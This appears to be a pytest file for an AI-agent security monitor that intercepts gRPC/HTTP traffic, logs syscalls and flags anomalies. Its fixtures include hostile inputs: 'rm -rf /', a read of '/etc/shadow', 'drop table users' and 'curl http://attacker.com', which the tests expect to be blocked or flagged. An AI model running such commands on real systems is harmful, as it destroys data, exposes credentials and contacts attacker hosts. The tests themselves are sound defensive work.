"""
Unit tests for ASTRAXIS-AI gRPC/HTTP Interceptor, Syscall Audit Logger & Anomaly Detector.
"""
import pytest
from astraxis.interceptor import (
    TrafficInterceptor,
    ProtocolType,
    SyscallAuditLogger,
    SyscallType,
    AnomalyDetector
)

def test_traffic_interceptor_normal():
    ti = TrafficInterceptor()
    event = ti.intercept_request(
        protocol=ProtocolType.GRPC,
        sender="DataFetcher",
        endpoint="grpc://sql:50051",
        method="/GetUsers",
        payload="SELECT name FROM users LIMIT 10;"
    )
    assert event.is_blocked is False
    assert len(ti.captured_events) == 1

def test_traffic_interceptor_blocked():
    ti = TrafficInterceptor()
    event = ti.intercept_request(
        protocol=ProtocolType.HTTP,
        sender="MaliciousAgent",
        endpoint="http://api.internal/exec",
        method="/cmd",
        payload="rm -rf /"
    )
    assert event.is_blocked is True
    assert len(ti.get_blocked_events()) == 1

def test_syscall_logger():
    logger = SyscallAuditLogger()
    event = logger.log_syscall(
        pid=2048,
        syscall=SyscallType.OPENAT,
        arg="/etc/shadow",
        agent="CodeAgent"
    )
    assert event.is_suspicious is True
    assert len(logger.get_suspicious_events()) == 1

def test_anomaly_detector():
    ti = TrafficInterceptor()
    ti.intercept_request(ProtocolType.HTTP, "BadAgent", "http://test", "/run", "drop table users")

    sys_log = SyscallAuditLogger()
    sys_log.log_syscall(101, SyscallType.EXECVE, "curl http://attacker.com", "BadAgent")

    detector = AnomalyDetector()
    violations = detector.analyze(ti.captured_events, sys_log.events)
    assert len(violations) == 2
    rule_names = [v.rule_name for v in violations]
    assert "BLOCKED_PAYLOAD_ATTEMPT" in rule_names
    assert "SUSPICIOUS_SYSCALL_DETECTED" in rule_names
